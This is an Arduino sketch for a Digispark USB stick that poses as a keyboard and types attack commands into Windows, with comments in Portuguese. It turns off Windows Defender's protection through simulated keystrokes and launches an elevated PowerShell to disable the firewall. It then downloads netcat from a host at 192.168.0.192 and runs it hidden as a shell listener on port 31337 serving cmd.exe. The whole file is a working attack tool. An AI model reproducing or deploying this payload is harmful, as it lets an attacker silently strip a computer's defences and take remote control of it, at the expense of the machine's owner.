#include "DigiKeyboard.h"
#include "DigiKeyboardPtBr.h"

void setup() {
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT);     
}

void loop() {
  pisca_led(100);
  //Desliga o Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t\t\t\t"); //4 TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t\t");  //2 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
  DigiKeyboard.delay(5000);
    //Desabilita o Firewall
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell start-process powershell -verb runas");  
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("\t\t"); //2 TAB
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden Set-NetFirewallProfile -Enabled False");  //Desabilita o Firewall :)
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(500);
  //Reverse shell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://192.168.0.192/nc.exe -OutFile tester.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden ./tester.exe -Lp 31337 -e cmd.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //
  pisca_led(1000); 
  for(;;){ /*empty*/ } 
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}
